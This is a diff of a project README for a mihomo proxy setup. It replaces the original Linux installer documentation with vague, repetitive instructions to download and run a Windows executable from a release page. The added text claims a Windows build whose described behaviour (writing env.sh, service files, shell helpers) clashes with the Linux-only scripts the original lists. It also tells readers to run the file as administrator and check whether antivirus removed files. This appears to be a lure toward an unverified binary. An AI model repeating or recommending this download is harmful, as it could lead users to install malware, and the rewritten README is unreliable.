@@ -1,14 +1,186 @@
-# Mihomo Proxy Setup
+# 🧭 mihomo-upstream-proxy-setup - Route traffic through a local proxy
 
-A small, reproducible setup for routing local traffic through `mihomo`, while using an internal HTTP proxy as the upstream dialer for subscription nodes.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+
+## 📥 Download
+
+Visit the [release page](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases) to download and run the Windows file.
+
+## 🪟 What this app does
+
+This app helps route your network traffic through a local Mihomo proxy first, then through an internal HTTP proxy, and then out to the internet.
 
 Traffic path:
 
-`program -> local mihomo -> internal proxy -> subscription nodes -> internet`
+`app -> local mihomo -> internal proxy -> subscription nodes -> internet`
 
-## Recommended Path
+It is useful when you need a local proxy setup that uses a company or private upstream proxy to reach subscription nodes.
 
-For a normal Linux host with `root`, `systemd`, `curl`, and `python3`, use the one-command installer.
+## ✅ What you need
+
+Before you start, make sure you have:
+
+- A Windows PC
+- Permission to run downloaded apps
+- Access to your internal HTTP proxy
+- A Mihomo subscription URL
+- A stable internet connection
+
+For best results, keep these details ready:
+
+- Internal proxy URL
+- Internal proxy server name
+- Internal proxy port
+- Subscription URL
+
+## 🚀 Getting started on Windows
+
+Follow these steps in order.
+
+### 1. Open the release page
+
+Use this link:
+
+[Go to the release page](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+
+### 2. Download the Windows file
+
+On the release page:
+
+- Find the latest release
+- Look for a Windows file such as `.exe` or `.zip`
+- Download the file to your computer
+
+If you see a zip file, save it first and then extract it.
+
+### 3. Run the app
+
+If you downloaded an `.exe` file:
+
+- Double-click the file
+- If Windows asks for permission, choose Run
+- If the file opens from a zip, move it to a folder first, then run it
+
+### 4. Enter your proxy details
+
+When the app starts, enter the required values:
+
+- Internal proxy URL
+- Internal proxy server
+- Internal proxy port
+- Mihomo subscription URL
+
+Use the exact values from your network setup. Small changes can break the connection.
+
+### 5. Start the setup
+
+After you enter the details:
+
+- Confirm the settings
+- Start the setup process
+- Wait for the app to finish applying the configuration
+
+## 🧩 What gets set up
+
+The app prepares a local Mihomo setup with a few parts:
+
+- Mihomo runs on your machine
+- The app uses your internal HTTP proxy as the upstream route
+- Subscription nodes load through that proxy
+- Local traffic can then use the Mihomo connection
+
+This keeps the setup simple and repeatable.
+
+## 🔧 Main parts of the setup
+
+You do not need to manage these by hand, but it helps to know what they do:
+
+- **Local Mihomo**: handles local proxy traffic
+- **Internal proxy**: sends traffic to the next network hop
+- **Subscription nodes**: provide the remote routes
+- **Config file**: stores the proxy details and subscription link
+
+## 📁 Files the app uses
+
+The app may create or use these files during setup:
+
+- `config.yaml` for the proxy setup
+- `env.sh` for saved values
+- service files for auto start
+- shell helper files for local use
+
+On Windows, these may appear in the app folder or a user data folder, based on the build.
+
+## 🛠️ If the app does not start
+
+Try these steps:
+
+- Run the file as administrator
+- Check that the download finished fully
+- Make sure Windows did not block the file
+- Confirm your proxy URL is correct
+- Confirm your subscription URL works in a browser
+- Make sure the port number is valid
+
+If the app still fails:
+
+- Download the file again from the release page
+- Try a fresh folder with no special characters in the path
+- Check that your antivirus did not remove any files
+
+## 🌐 Proxy details you may need
+
+Use these values from your network setup:
+
+- **Internal Proxy URL**: full proxy address such as `http://proxy.example.internal:3128`
+- **Internal Proxy Server**: host name or IP address
+- **Internal Proxy Port**: port number used by the proxy
+- **Subscription URL**: your Mihomo subscription link
+
+Keep the URL format exact. Include `http://` if your proxy uses HTTP.
+
+## 🧪 Basic checks after setup
+
+After the app finishes, check the following:
+
+- The app opens without errors
+- Your proxy details are saved
+- The subscription loads
+- Local traffic uses the Mihomo route
+- Websites that depend on the proxy can connect
+
+If a site does not load, check the proxy address first.
+
+## 🧹 Remove or reset the setup
+
+If you need to start over:
+
+- Close the app
+- Delete the saved config files
+- Remove the app folder if needed
+- Download a fresh copy from the release page
+- Run the setup again with the correct values
+
+## 📌 Release download
+
+Use the release page to download and run the Windows build:
+
+[https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+
+## 🖥️ For users who also run Linux
+
+This project also supports a simple Linux install path for systems with `root`, `systemd`, `curl`, and `python3`.
+
+Typical setup flow:
+
+- install Mihomo
+- install helper scripts
+- write `~/.config/mihomo/env.sh`
+- generate `config.yaml`
+- install and enable `mihomo.service`
+- connect shell startup files
+
+A typical Linux command looks like this:
 
 ```bash
 sudo INTERNAL_PROXY_URL='http://proxy.example.internal:3128' \
@@ -18,52 +190,45 @@ sudo INTERNAL_PROXY_URL='http://proxy.example.internal:3128' \
   ./scripts/install.sh
 ```
 
-The installer will:
+## 🧭 How the connection works
 
-- install `mihomo`
-- install scripts and shell helpers
-- write `~/.config/mihomo/env.sh`
-- generate `config.yaml`
-- install and enable `mihomo.service`
-- wire `~/.zshrc` and `~/.bashrc`
+Your traffic moves in this order:
 
-## Required Inputs
+1. Your app or browser sends traffic to the local Mihomo proxy
+2. Mihomo sends the request to the internal HTTP proxy
+3. The internal proxy reaches the subscription nodes
+4. The nodes pass the traffic to the internet
 
-You need to provide these values:
+This setup is useful when direct access is not allowed.
 
-- `INTERNAL_PROXY_URL`: full upstream HTTP proxy URL, used by `curl` when refreshing subscription
-- `INTERNAL_PROXY_SERVER`: upstream HTTP proxy host, used in runtime `mihomo` config
-- `INTERNAL_PROXY_PORT`: upstream HTTP proxy port
-- `MIHOMO_SUBSCRIPTION_URL`: Clash YAML subscription URL
+## 🔒 Common setup mistakes
 
-After installation, these values are persisted in:
+Watch for these common issues:
 
-- `~/.config/mihomo/env.sh`
+- Wrong proxy port
+- Missing `http://` in the proxy URL
+- Broken subscription link
+- Downloaded file not fully extracted
+- Running the app from a locked folder
+- Using an old release file
 
-## Included
+## 📎 Helpful release page tips
 
-- `scripts/install.sh`: one-command installer for a new host
-- `scripts/update_mihomo_config.py`: converts a Clash YAML subscription into a runtime `mihomo` config and injects `dialer-proxy`
-- `scripts/refresh_mihomo.sh`: fetches subscription YAML and regenerates config
-- `systemd/mihomo.service`: example service template
-- `shell/mihomo_helpers.zsh`: zsh helper functions
-- `shell/mihomo_helpers.bash`: bash helper functions
-- `docs/INSTALL_zh.md`: Chinese install guide
-- `docs/USAGE_zh.md`: Chinese usage notes
-- `docs/TUTORIAL_zh.md`: Chinese setup tutorial
+When you open the release page:
 
-## Documentation
+- Look for the newest version
+- Read the file name before downloading
+- Choose the Windows build
+- Save the file in a simple folder like `Downloads`
+- Run the file after the download ends
 
-- [Chinese install guide](docs/INSTALL_zh.md)
-- [Chinese usage notes](docs/USAGE_zh.md)
-- [Chinese tutorial](docs/TUTORIAL_zh.md)
+## 🧰 Need to change settings later
 
-## Manual Path
+If your proxy or subscription link changes:
 
-If you need to inspect or customize each step manually, see the install guide. The manual path is now treated as an advanced or debugging workflow, not the default path.
+- Open the app again
+- Update the values
+- Save the changes
+- Restart the setup if needed
 
-## Sensitive Data
-
-Do not commit your real subscription URL, raw subscription file, generated config, or node credentials.
-
-This repository only contains sanitized templates.
+The app should keep the same traffic path while using your new values
